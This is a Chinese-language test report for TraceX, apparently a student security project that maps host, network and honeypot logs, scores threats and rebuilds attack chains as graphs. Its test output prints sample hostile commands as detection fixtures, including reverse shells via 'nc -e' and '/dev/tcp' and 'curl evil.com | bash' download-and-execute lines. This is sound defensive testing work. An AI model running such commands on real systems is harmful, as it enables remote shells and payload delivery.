
测试状态: ✅ 100% 通过

测试日期: 2026-01-14

测试范围: Context Engine (评分/关联), Atlas Mapper (语义映射), Graph Builder (图构建), Provenance System (全链路溯源)

---

## 📋 1. 测试概览 (Test Summary)

本项目已完成并通过了以下核心模块的单元测试与集成测试，覆盖了从日志采集到攻击链重构的全流程。

|**模块层级**|**测试脚本**|**测试目标**|**结果**|
|---|---|---|---|
|**L1. 数据清洗**|`test_field_mapper_coverage.py`|验证多源日志 (Auditd, Zeek, Cowrie) 字段标准化的正确性|✅ PASS|
|**L2. 威胁检测**|`test_host_collector_full_verification.py`<br><br>  <br><br>`test_network_collector_final.py`|验证 Sigma 规则评分引擎对主机/网络攻击行为的检测能力|✅ PASS|
|**L3. 语义映射**|`test_atlas_mapper_exhaustive.py`|验证底层日志转 ATLAS 语义标签的正则准确性与优先级|✅ PASS|
|**L4. 图谱构建**|`test_graph_builder_logic.py`|验证 PID 复用处理、父子进程关联及节点唯一性生成逻辑|✅ PASS|
|**L5. 系统集成**|`test_provenance_integration.py`|验证完整攻击路径的自动重构与签名生成|✅ PASS|

---

## 🔍 2. 详细测试结果

### 2.1 组员3：数据采集与威胁评分验证

我们首先验证了系统能否正确识别并评分来自主机（组员1）和网络（组员2）的原始数据。

#### (A) 字段映射覆盖率 (Field Mapping)

确保原始 JSON 日志能正确映射到 TraceX 的标准字段模型。

- **测试脚本**: `tests/test_field_mapper_coverage.py`
    
- **关键结果**:
    
    - ✅ **Auditd**: 成功提取 `EXECVE` 系统调用并映射为进程事件。
        
    - ✅ **Cowrie**: 成功提取蜜罐 `input` 指令并关联 `session` ID。
        
    - ✅ **Zeek**: 成功映射网络五元组 (`id.orig_h` -> `source.ip`)。
        

#### (B) 主机安全检测 (Host Security)

- **测试脚本**: `tests/test_host_collector_full_verification.py`
    
- **关键通过项**:
    
    - `反弹 Shell (Bash TCP)` -> 评分: 85 (HIGH)
        
    - `WebShell 文件写入` -> 评分: 90 (CRITICAL)
        
    - `内存无文件攻击 (MemDefense)` -> 评分: 100 (CRITICAL)
        

#### (C) 网络安全检测 (Network Security)

- **测试脚本**: `tests/test_network_collector_final.py`
    
- **关键通过项**:
    
    - `DNS 隧道` / `ICMP 隧道` -> 评分: 80 (HIGH)
        
    - `蜜罐恶意指令 (wget/curl/rm)` -> 评分: 100 (CRITICAL)
        

---

### 2.2 组员4：图谱构建核心逻辑验证

此部分验证了溯源分析中最核心的算法逻辑，特别是解决 Linux 环境下的数据歧义问题。

#### (A) ATLAS 语义映射 (Semantic Mapping)

验证系统能否理解攻击者的意图，特别是处理复杂命令行组合。

- **测试脚本**: `tests/test_atlas_mapper_exhaustive.py`
    
- **核心验证点**:
    
    - ✅ **正则优先级修复**: 成功验证 `curl | bash` 被优先识别为 `DOWNLOAD_AND_EXECUTE`（高危），而不是普通的 `SUSPICIOUS_DOWNLOADER`。
        
    - ✅ **逻辑推断**: 在缺失网络方向时，能根据进程名 (`curl` vs `nginx`) 自动推断流量方向。
        
    - ✅ **复杂变体**: 覆盖了 `bash -i`、`/dev/tcp`、`nc -e` 等多种反弹 Shell 写法。
        

#### (B) 图构建与 PID 复用 (Graph Construction)

验证图数据库构建的准确性，确保溯源链路不断裂、不混淆。

- **测试脚本**: `tests/test_graph_builder_logic.py`
    
- **核心验证点**:
    
    - ✅ **PID 复用解决**: 验证了在不同时间点启动的同一 PID (如 PID 8888) 能够被正确拆分为两个独立的图节点，避免了“张冠李戴”。
        
    - ✅ **父子关联**: 验证了 `spawned` 边能正确连接父进程与子进程。
        
    - ✅ **时序唯一性**: 验证了对同一文件的“写入”和“删除”操作会生成不同的节点，保留了完整的攻击时间线。
        

---

### 2.3 全链路集成测试 (Full Integration)

这是系统的验收测试，模拟真实世界的攻击场景。

#### 场景：自动化攻击链重构

- **测试脚本**: `tests/test_provenance_integration.py`
    
- **模拟场景**: 攻击者通过 SSH 爆破进入系统，进行网络扫描，随后下载并执行恶意脚本。
    
- **执行结果**:
    
    Plaintext
    
    ```
    [Stats] 处理事件数: 4
    [Graph] 节点数: 7, 边数: 3
    [Signature] 攻击路径签名: AUTHENTICATION_SUCCESS -> DOWNLOAD_AND_EXECUTE -> NETWORK_SCANNER -> SHELL_EXECUTION
    [Attribution] 疑似组织: Unclassified
    ```
    
- **结论**: 系统成功将散落的日志自动串联成了一条清晰的攻击路径，证明了 **Context Engine -> Atlas Mapper -> Graph Builder -> Provenance System** 的数据流完全打通。
    

---

## 🚀 3. 如何复现测试

所有测试脚本均已包含在 `tests/` 目录下。您可以通过以下命令一键复现关键测试：

Bash

```
# 1. 验证全链路溯源集成
python3 tests/test_provenance_integration.py

# 2. 验证图构建核心逻辑 (PID 复用)
python3 tests/test_graph_builder_logic.py

# 3. 验证语义标签映射
python3 tests/test_atlas_mapper_exhaustive.py
```

## 具体测试结果
### sigma 评分

```Bash
python3 tests/test_field_mapper_coverage.py
```

```output
🔍 [FieldMapper] 覆盖率测试: test_auditd_fallback_mapping
   [Auditd] Mapped Fields: {'Image': 'netcat', 'ProcessName': 'netcat', 'CommandLine': 'nc -e /bin/sh 1.2.3.4', 'User': '', 'ProcessId': None, 'EventTime': None, '_original': {'event': {'dataset': 'auditd', 'category': 'process'}, 'process': {'name': 'netcat'}, 'raw': {'type': 'EXECVE', 'data': 'nc -e /bin/sh 1.2.3.4'}}}
   ✅ Auditd 兜底逻辑验证通过
.
🔍 [FieldMapper] 覆盖率测试: test_cowrie_command_mapping
   [Cowrie] LogSource Identified: {'product': 'cowrie', 'category': 'process_creation'}
   [Cowrie] Mapped Fields: {'src_ip': '59.64.129.102', 'input': 'curl http://evil.com/mal', 'eventid': 'cowrie.command.input', 'session': 'a1b2c3d4', 'CommandLine': 'curl http://evil.com/mal', '_original': {'event': {'dataset': 'cowrie', 'category': 'process', 'action': 'input'}, 'process': {'command_line': 'curl http://evil.com/mal'}, 'raw': {'eventid': 'cowrie.command.input', 'session': 'a1b2c3d4', 'input': 'curl http://evil.com/mal', 'src_ip': '59.64.129.102'}}}
   ✅ Cowrie Command 映射验证通过
.
🔍 [FieldMapper] 覆盖率测试: test_zeek_conn_mapping
   [Zeek] LogSource Identified: {'product': 'zeek', 'category': 'network_connection', 'service': 'conn'}
   [Zeek] Mapped Fields: {'id.orig_h': '192.168.1.5', 'id.orig_p': 12345, 'id.resp_h': '10.0.0.1', 'id.resp_p': 80, 'proto': 'tcp', 'service': 'http', '_original': {'event': {'dataset': 'zeek.conn', 'category': 'network'}, 'source': {'ip': '192.168.1.5', 'port': 12345}, 'destination': {'ip': '10.0.0.1', 'port': 80}, 'network': {'transport': 'tcp', 'protocol': 'http'}, 'raw': {'id.orig_h': '192.168.1.5', 'id.resp_h': '10.0.0.1', 'proto': 'tcp'}}}
   ✅ Zeek Conn 映射验证通过
.
----------------------------------------------------------------------
Ran 3 tests in 0.021s

OK
```
### context_engine.py 评分

测试主机采集（组员1）部分
```Bash
python3 tests/test_host_collector_full_verification.py
```

```output
🚀 TraceX 主机采集全功能验证开始...

================================================================================
🧪 [Process] 测试场景: 反弹 Shell (Bash TCP)
   📊 评分: 85 | 等级: HIGH
   📝 依据: ['Heuristic: Reverse Shell Pattern']
   ✅ [PASS]

================================================================================
🧪 [Process] 测试场景: 黑客工具 (Ncat)
   📊 评分: 70 | 等级: HIGH
   📝 依据: ['Heuristic: Dangerous Tool (ncat)']
   ✅ [PASS]

================================================================================
🧪 [Process] 测试场景: 可疑下载 (Wget)
   📊 评分: 60 | 等级: MEDIUM
   📝 依据: ['Heuristic: Suspicious Tool (wget)']
   ✅ [PASS]

================================================================================
🧪 [Process] 测试场景: 低权用户异常 (www-data curl)
   📊 评分: 75 | 等级: HIGH
   📝 依据: ['Heuristic: Suspicious Tool (curl)', 'Heuristic: Low-Priv User (www-data) Executing Tool']
   ✅ [PASS]

================================================================================
🧪 [File] 测试场景: WebShell 命令行写入
   📊 评分: 85 | 等级: HIGH
   📝 依据: ['Heuristic: WebShell Pattern in Command']
   ✅ [PASS]

================================================================================
🧪 [File] 测试场景: WebShell 文件写入事件
   📊 评分: 90 | 等级: CRITICAL
   📝 依据: ['Heuristic: WebShell Write (/var/www/html/backdoor.jsp)']
   ✅ [PASS]

================================================================================
🧪 [File] 测试场景: 敏感文件读取 (/etc/shadow)
   📊 评分: 70 | 等级: HIGH
   📝 依据: ['Heuristic: Sensitive/Persistence File Access']
   ✅ [PASS]

================================================================================
🧪 [Persistence] 测试场景: Cron 计划任务写入
   📊 评分: 70 | 等级: HIGH
   📝 依据: ['Heuristic: Sensitive/Persistence File Access']
   ✅ [PASS]

================================================================================
🧪 [Persistence] 测试场景: 启动项修改 (rc.local)
   📊 评分: 70 | 等级: HIGH
   📝 依据: ['Heuristic: Sensitive/Persistence File Access']
   ✅ [PASS]

================================================================================
🧪 [Windows] 测试场景: PowerShell 编码指令
   📊 评分: 70 | 等级: HIGH
   📝 依据: ['Heuristic: PowerShell Encoded/Hidden Command']
   ✅ [PASS]

================================================================================
🧪 [Windows] 测试场景: Certutil 下载 (LotL)
   📊 评分: 65 | 等级: MEDIUM
   📝 依据: ['Heuristic: Certutil Download Activity']
   ✅ [PASS]

================================================================================
🧪 [Auth] 测试场景: Root 远程登录
   📊 评分: 60 | 等级: MEDIUM
   📝 依据: ['Authentication: Root Remote Login from 192.168.1.50']
   ✅ [PASS]

================================================================================
🧪 [Auth] 测试场景: 登录失败 (暴力破解迹象)
   📊 评分: 40 | 等级: LOW
   📝 依据: ['Authentication: Login Failure']
   ✅ [PASS]

================================================================================
🧪 [Agent] 测试场景: Agent 整数评分兼容性
   📊 评分: 80 | 等级: HIGH
   📝 依据: ['Agent Reported Severity: 8']
   ✅ [PASS]

================================================================================
🧪 [Memory] 测试场景: 内存无文件攻击 (Critical)
   📊 评分: 100 | 等级: CRITICAL
   📝 依据: ['MemDefense: Critical Anomaly (ELF_HEADER)']
   ✅ [PASS]

================================================================================
🧪 [Memory] 测试场景: 内存 RWX 异常 (High)
   📊 评分: 90 | 等级: CRITICAL
   📝 依据: ['MemDefense: High Risk Anomaly (RWX_REGION)']
   ✅ [PASS]
----------------------------------------------------------------------
Ran 16 tests in 0.001s

OK
```


测试网络采集部分（组员2）：
```Bash
python3 tests/test_network_collector_final.py
```

```output
🚀 TraceX 组员2 (网络) 交付文档 100% 覆盖验证...

================================================================================
🧪 [Zeek] 测试场景: DNS 隧道
   📊 评分: 80 | 等级: HIGH
   📝 依据: ['Sigma Rule: HIGH', 'ATT&CK: DNS Tunneling']
   ✅ [PASS]

================================================================================
🧪 [Zeek] 测试场景: ICMP 隧道
   📊 评分: 80 | 等级: HIGH
   📝 依据: ['Sigma Rule: HIGH', 'ATT&CK: ICMP Tunneling']
   ✅ [PASS]

================================================================================
🧪 [Zeek] 测试场景: HTTP 文件传输
   📊 评分: 30
   ✅ [PASS]

================================================================================
🧪 [Cowrie] 测试场景: 恶意下载 (wget)
   📊 评分: 100.0 | 等级: CRITICAL
   📝 依据: ['CRITICAL: Honeypot Command']
   ✅ [PASS]

================================================================================
🧪 [Cowrie] 测试场景: 恶意下载 (curl)
   📊 评分: 100.0 | 等级: CRITICAL
   📝 依据: ['CRITICAL: Honeypot Command']
   ✅ [PASS]

================================================================================
🧪 [Cowrie] 测试场景: 读取 /etc/passwd
   📊 评分: 100 | 等级: CRITICAL
   📝 依据: ['CRITICAL: Honeypot Command']
   ✅ [PASS]

================================================================================
🧪 [Cowrie] 测试场景: 身份探测 (whoami)
   📊 评分: 100 | 等级: CRITICAL
   📝 依据: ['CRITICAL: Honeypot Command']
   ✅ [PASS]

================================================================================
🧪 [Cowrie] 测试场景: 删除文件 (rm)
   📊 评分: 100 | 等级: CRITICAL
   📝 依据: ['CRITICAL: Honeypot Command']
   ✅ [PASS]

================================================================================
🧪 [Cowrie] 测试场景: 移动文件 (mv)
   📊 评分: 100 | 等级: CRITICAL
   📝 依据: ['CRITICAL: Honeypot Command']
   ✅ [PASS]

================================================================================
🧪 [Cowrie] 测试场景: 辅助操作 (touch)
   📊 评分: 100 | 等级: CRITICAL
   📝 依据: ['CRITICAL: Honeypot Command']
   ✅ [PASS]
----------------------------------------------------------------------
Ran 10 tests in 0.001s

OK
```

### 📁 组员4部分

测试对应关系一览表

| **测试脚本文件名 (tests/)**                     | **核心测试目标文件 (analyzer/)**                 | **测试的核心逻辑**                                              |
| ---------------------------------------- | ---------------------------------------- | -------------------------------------------------------- |
| **1. `test_atlas_mapper_exhaustive.py`** | `atlas_mapper.py`                        | **语义翻译**：验证能否读懂日志。例如 `curl` 是下载工具，`curl                  |
| **2. `test_graph_builder_logic.py`**     | `graph_builder.py`<br><br>`pid_cache.py` | **图构建与缓存**：验证 PID 复用（区分不同时间的同 PID 进程）、父子进程关联逻辑、以及本地缓存读写。 |
| **3. `test_provenance_integration.py`**  | `provenance_system.py`                   | **全链路控制器**：验证“总指挥”能否正确调用上述两个模块，完成从“告警”到“攻击路径签名”的全过程。     |
```Bash
python3 tests/test_atlas_mapper_exhaustive.py
```

```output
[test_cmdline_variations] 测试开始...
   Testing Bash TCP: bash -i >& /dev/tcp/10.0.0.1/8... -> REVERSE_SHELL
   Testing Netcat -e: nc -e /bin/sh 10.0.0.1 1234... -> REVERSE_SHELL
   Testing Ncat -e: ncat -e /bin/bash 10.0.0.1 123... -> REVERSE_SHELL
   Testing Curl Pipe Bash: curl http://evil.com/s.sh | ba... -> DOWNLOAD_AND_EXECUTE
   Testing Wget Pipe Bash: wget -qO- http://evil.com/s.sh... -> DOWNLOAD_AND_EXECUTE
   Testing Curl to Tmp: curl http://evil.com -o /tmp/m... -> DOWNLOAD_TO_TEMP
   Testing Wget to Tmp: wget http://evil.com -O /tmp/m... -> DOWNLOAD_TO_TEMP
   Testing Base64 Decode: echo 'Y2F0IC9ldGMvcGFzc3dk' | ... -> ENCODED_EXECUTION
.
[test_field_fallback] 测试开始...
   Testing Process Name Fallback (nmap) -> NETWORK_SCANNER
.
[test_global_fallback] 测试开始...
   Testing Global Fallback -> PROCESS_START
.
[test_network_direction_inference] 测试开始...
   Testing Inference (curl) -> HTTP_REQUEST
   Testing Inference (nginx) -> HTTP_REQUEST
.
[test_special_paths] 测试开始...
   Testing Cowrie Download -> COWRIE_DOWNLOAD
   Testing /dev/shm -> TEMP_FILE_ACCESS
.
[test_ssh_vs_sensitive] 测试开始...
   Testing .ssh path -> SSH_RELATED
.
[test_webshell_logic_branch] 测试开始...
   Testing WebShell Action 'read' -> WEB_ROOT_ACCESS
   Testing WebShell Action 'open' -> WEB_ROOT_ACCESS
   Testing WebShell Action 'access' -> WEB_ROOT_ACCESS
.
----------------------------------------------------------------------
Ran 7 tests in 0.003s

OK
```


```Bash
python3 tests/test_graph_builder_logic.py
```

```output
[test_child_process_linkage] 测试开始...
   正在构建图谱...
   生成节点数: 2 (预期: 2)
   生成边数: 1 (预期: 1)
   ✅ 找到关系边: 85344c9b7d5de2adcd1641b7a5f8ef79 -> spawned -> 5e2ecbba1683cbdaa613811e96f6fcfa
.
[test_file_operation_distinctness] 测试开始...
   Write ID: cfd056f928ed09a05e56481e3f41c127
   Delete ID: ce7fe29b05b9f7acd209ed273fc073e4
   ✅ 文件操作唯一性验证通过
.
[test_pid_reuse_handling] 测试开始...
   [上午进程] Nginx (PID 8888) Node ID: 150eda5b15754a2728c280a22a0ac745
   [下午进程] Mining (PID 8888) Node ID: f9aee625fd31e7bb90570ac0d0eafd5b
   ✅ PID 复用区分验证通过
.
----------------------------------------------------------------------
Ran 3 tests in 0.003s

OK
```

```Bash
python3 tests/test_provenance_integration.py
```

```output
[test_child_process_linkage] 测试开始...
   正在构建图谱...
   生成节点数: 2 (预期: 2)
   生成边数: 1 (预期: 1)
   ✅ 找到关系边: 85344c9b7d5de2adcd1641b7a5f8ef79 -> spawned -> 5e2ecbba1683cbdaa613811e96f6fcfa
.
[test_file_operation_distinctness] 测试开始...
   Write ID: cfd056f928ed09a05e56481e3f41c127
   Delete ID: ce7fe29b05b9f7acd209ed273fc073e4
   ✅ 文件操作唯一性验证通过
.
[test_pid_reuse_handling] 测试开始...
   [上午进程] Nginx (PID 8888) Node ID: 150eda5b15754a2728c280a22a0ac745
   [下午进程] Mining (PID 8888) Node ID: f9aee625fd31e7bb90570ac0d0eafd5b
   ✅ PID 复用区分验证通过
.
----------------------------------------------------------------------
Ran 3 tests in 0.003s

OK
root@iZ2ze082hzl5s9xfijazalZ:~/TraceX# ^C
root@iZ2ze082hzl5s9xfijazalZ:~/TraceX# ^C
root@iZ2ze082hzl5s9xfijazalZ:~/TraceX# python3 tests/test_provenance_integration.py

[test_full_attack_chain_reconstruction] 集成测试开始...
   正在执行 rebuild_attack_path...
   [Stats] 处理事件数: 4
   [Signature] 攻击路径签名: AUTHENTICATION_SUCCESS -> DOWNLOAD_AND_EXECUTE -> NETWORK_SCANNER -> SHELL_EXECUTION
   [Attribution] 疑似组织: Unclassified
   [Graph] 节点数: 7, 边数: 3
   ✅ 完整攻击链重构集成测试通过
.
----------------------------------------------------------------------
Ran 1 test in 0.243s

OK
```